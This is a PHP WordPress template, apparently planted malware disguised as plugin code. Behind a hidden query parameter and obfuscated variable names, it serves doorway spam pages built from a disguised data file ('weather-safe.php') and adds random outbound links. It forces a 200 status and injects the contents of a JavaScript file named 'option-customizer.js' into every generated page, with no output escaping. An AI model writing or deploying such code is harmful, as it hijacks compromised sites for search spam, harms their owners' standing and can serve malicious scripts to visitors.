<?php
$iHDC40G = intval(get_query_var('ahyurytz'));

if ($iHDC40G < 1 || $iHDC40G > 3189) return;
$x5rQtiMc = file(plugin_dir_path(__FILE__).'weather-safe.php', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

$oEeTBIs2x = explode(';', $x5rQtiMc[$iHDC40G]);
if (count($oEeTBIs2x) < 2) return;
$ztARt7j3J = $oEeTBIs2x[0];
$rFh0oYTBX6  = $oEeTBIs2x[1];
$sFu799 = $oEeTBIs2x[2];
$a38lgWS  = $oEeTBIs2x[3];
$vgLesq2UoH = $oEeTBIs2x[4];
set_query_var('socjezxvz', $ztARt7j3J);

$yNlCiRhA5 = '';
$p7q3bW = plugin_dir_path(__FILE__).'description-cdn.php';
if (is_file($p7q3bW)) {
	$awv7rY = file($p7q3bW, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
	array_shift($awv7rY);
	shuffle($awv7rY);
	$t5LM2lR = mt_rand(2, 5);
	if (count($awv7rY) > $t5LM2lR) {
		for ($jaXx1qB = 0; $jaXx1qB < $t5LM2lR; $jaXx1qB++) {
			$ifcTBsDc = array_shift($awv7rY);
			$yNlCiRhA5 .= '<p><a href="'.$ifcTBsDc.'">'.$ifcTBsDc.'</a>' . "</p>\n";
		}
	}
}

status_header(200);
get_header();
?>

<div id="primary" class="content-area">
	<main id="main" class="site-main wp-block-group has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
		<article class="page type-page wp-block-group alignfull has-global-padding is-layout-constrained wp-block-group-is-layout-constrained">
			<header class="entry-header">
				<h1 class="entry-title wp-block-post-title"><?php echo $ztARt7j3J; ?></h1>
			</header>
			<div class="entry-content alignfull wp-block-post-content has-global-padding is-layout-constrained wp-block-post-content-is-layout-constrained">
				<?php
				echo "<p>" . $rFh0oYTBX6 . "</p>\n";
				if (strlen($a38lgWS) > 0) echo "<p>" . $a38lgWS . "</p>\n";
				if (strlen($sFu799) > 0) echo "<p>" . $sFu799 . "</p>\n";
				if (strlen($vgLesq2UoH) > 0) echo '<p><a href="#"><img src="'.$vgLesq2UoH.'"></a>' . "</p>\n";
				echo $yNlCiRhA5;
				?>
			</div>
		</article>
	</main>
</div>

<?php
$qzFsZb = plugin_dir_path(__FILE__) . 'option-customizer.js';
if (is_file($qzFsZb)) {
	echo '<script type="text/javascript">';
	echo file_get_contents($qzFsZb);
	echo '</script>';
}
get_footer();
?>
